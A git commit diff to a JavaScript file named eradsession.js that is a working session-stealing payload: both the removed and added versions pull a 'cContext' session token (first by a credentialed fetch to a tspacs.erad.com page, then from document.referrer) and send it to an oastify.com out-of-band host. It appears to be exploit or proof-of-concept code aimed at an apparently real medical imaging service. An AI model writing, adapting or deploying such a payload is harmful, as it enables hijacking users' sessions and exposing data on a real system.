e385c42d9d58b3ed472a4980ebf5ce2b6be2e0d2
tomoncrss <tonymyson89823@gmail.com>
2026-02-25 12:00:40 +0330

    Update eradsession.js

--- eradsession.js
+++ eradsession.js
@@ -1,8 +1,5 @@
 (function(){
-fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxy&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include'})
-.then(r=>r.text())
-.then(t=>{
-let c=t.match(/cContext=([^"&'\s]+)/);
+let ref=document.referrer;
+let c=ref.match(/cContext=([^&]+)/);
 if(c) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+c[1],{mode:'no-cors'});
-});
 })();
